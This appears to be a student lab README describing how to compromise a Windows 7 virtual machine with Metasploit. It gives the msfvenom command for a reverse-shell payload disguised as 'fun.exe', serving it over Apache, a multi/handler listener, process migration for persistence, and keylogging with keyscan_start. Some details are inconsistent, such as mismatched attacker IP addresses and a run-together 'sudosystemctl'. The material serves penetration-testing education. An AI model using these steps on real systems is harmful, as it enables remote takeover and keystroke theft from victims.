# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
### ifconfig
192.168.91.247

![Alt text](img/ipconfig6(1).png)

Find the attackers ip address using ifconfig

### msfvenom

![Alt text](img/msfvenom(1)new.png)

Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

### copy the fun.exe into apache/var/www/html/

![Alt text](img/systemctl(1).png)

copy fun.exe
start apache server
sudosystemctl apache2 start
check the status of apache2

### msfconsole

![Alt text](img/msfconsolehelp.png)

invoke msfconsole
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

### Multihander,setpayload,exploit



On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Parrot machine:
http://192.168.91.247/

![Alt text](img/new1.png)

![Alt text](img/catarul.png)

![Alt text](<img/VirtualBox_windows 7_21_04_2025_13_34_08(2).png>)

![Alt text](img/folderforfunexe.png)

![Alt text](img/usemulti.png)

Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit

To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

![Alt text](img/ps.png)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 

![Alt text](img/netstat.png)

### Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![Alt text](img/keyscan_startanddump.png)

![Alt text](img/output.png)

![Alt text](img/keyscan_startanddump.png)



## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
